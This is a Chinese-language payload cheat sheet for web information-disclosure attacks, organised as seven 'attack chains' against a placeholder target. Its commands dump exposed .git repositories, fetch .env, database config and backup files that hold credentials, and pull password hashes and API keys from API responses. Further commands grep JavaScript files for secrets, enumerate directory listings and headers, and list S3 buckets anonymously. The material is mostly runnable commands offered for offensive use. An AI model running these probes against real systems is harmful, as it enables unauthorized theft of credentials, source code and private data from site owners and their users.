# 信息泄露 (Information Disclosure)

_7 条 web payload_

---

### 源码/配置文件泄露  `info-source-leak`
_通过常见路径探测暴露的敏感文件_
子类：**路径探测** · tags: `info` `disclosure` `git` `env`

**前置条件：**
- 目标 Web 服务未屏蔽敏感路径
- 开发/部署时未清理遗留文件

**攻击链：**

**1. Git 仓库泄露**
```bash
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.git/config
# 有回显则用 git-dumper 拉取完整源码
git-dumper https://target.com/.git ./output
```

**2. 环境配置文件**
```bash
curl -s https://target.com/.env
curl -s https://target.com/.env.local
curl -s https://target.com/.env.production
curl -s https://target.com/config.php
curl -s https://target.com/database.yml
curl -s https://target.com/application.properties
```

**3. 备份文件**
```bash
curl -s https://target.com/index.php.bak
curl -s https://target.com/backup.zip
curl -s https://target.com/db.sql
curl -s https://target.com/site.tar.gz
# 批量探测
ffuf -u https://target.com/FUZZ -w backup_extensions.txt
```

### API 过度数据暴露  `info-api-overexposure`
_API 响应返回超出前端展示所需的敏感字段_
子类：**过度暴露** · tags: `api` `info` `idor`

**前置条件：**
- REST/GraphQL API 返回完整对象
- 前端过滤但后端不过滤

**攻击链：**

**1. 对比前端展示字段 vs 完整 API 响应**
```bash
# 抓取 API 响应，关注隐藏字段
curl -s https://api.target.com/v1/users/me \
  -H "Authorization: Bearer <token>" | jq .

# 常见泄露字段
# password_hash, api_key, internal_id, email, phone, ssn
```

**2. GraphQL 内省探测**
```graphql
{ __schema { types { name fields { name } } } }
```

### 错误信息/堆栈泄露  `info-error-stack`
_未处理异常暴露框架版本、数据库结构、内部路径_
子类：**错误泄露** · tags: `debug` `stack-trace` `version`

**前置条件：**
- 生产环境开启 debug 模式
- 异常未被统一捕获

**攻击链：**

**1. 触发异常**
```bash
# 传递非预期类型
GET /api/users/abc          # 期望数字
GET /api/search?q[]=test    # 期望字符串
POST /api/data Content-Type: text/plain  # 期望JSON
```

**2. 关注响应中的**
```
stack trace / traceback
ActiveRecord / Hibernate 错误含 SQL
文件绝对路径 /var/www/html/app/...
框架版本 Rails 6.0.0 / Django 3.2
数据库字段名
```

### JS 注释/源码泄露  `info-js-comment`
_前端 JS 文件中残留内部 API、密钥、业务逻辑_
子类：**JS泄露** · tags: `javascript` `api-key` `endpoint`

**攻击链：**

**1. 批量下载并搜索 JS 文件**
```bash
# 用 gau/waybackurls 收集 JS 文件
gau target.com | grep "\.js$" | httpx -sr -o js_files.txt

# 搜索敏感内容
grep -E "(api_key|secret|password|token|internal|admin)" js_files.txt
grep -E "https?://[a-z0-9.-]+/api/" js_files.txt

# sourcemap 还原
find . -name "*.js.map" -exec source-map-unpack {} \;
```

### 目录列表  `info-directory-listing`
_Web 服务器未禁用目录索引，暴露文件列表_
子类：**目录遍历** · tags: `listing` `directory`

**攻击链：**

```bash
# 探测常见目录
for dir in uploads files static assets backup logs tmp; do
  curl -s -o /dev/null -w "%{http_code} $dir\n" https://target.com/$dir/
done

# 关注含文件列表的 HTML 响应 ("Index of /")
```

### HTTP 响应头泄露  `info-headers`
_响应头暴露服务器版本、框架、内部 IP_
子类：**响应头** · tags: `headers` `version` `internal-ip`

**攻击链：**

```bash
curl -sI https://target.com | grep -iE \
  "(server|x-powered-by|x-aspnet|via|x-real-ip|x-forwarded)"

# 关注
# Server: Apache/2.4.49
# X-Powered-By: PHP/7.4.3
# X-Real-IP: 10.0.0.5  ← 内网 IP
```

### 云存储/CDN 泄露  `info-cloud-storage`
_S3/OSS/GCS bucket 公开可读，或 CDN 回源路径暴露_
子类：**云存储** · tags: `s3` `bucket` `oss`

**攻击链：**

```bash
# S3 bucket 枚举
aws s3 ls s3://target-company --no-sign-request
curl -s https://target-company.s3.amazonaws.com/

# Bucket 命名变体
for name in target target-backup target-uploads target-prod; do
  curl -s -o /dev/null -w "%{http_code} $name\n" \
    https://$name.s3.amazonaws.com/
done
```
